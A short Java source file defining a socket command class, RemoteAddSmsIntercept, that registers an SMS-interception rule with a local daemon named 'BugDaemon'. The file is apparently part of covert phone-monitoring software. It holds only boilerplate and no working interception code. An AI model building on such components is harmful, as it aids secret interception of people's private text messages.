package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.callmanager.ref.SmsInterceptInfo;

public class RemoteAddSmsIntercept extends SocketCmd<SmsInterceptInfo, Boolean> {
	
	private static final long serialVersionUID = -3715754659619005159L;
	
	private static final String TAG = "RemoteAddSmsIntercept";
	private static final String SERVER_NAME = BugDaemonResource.CallMgr.SOCKET_NAME;

	public RemoteAddSmsIntercept(SmsInterceptInfo smsIntercept) {
		super(smsIntercept, Boolean.class);
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	@Override
	protected String getServerName() {
		return SERVER_NAME;
	}

}
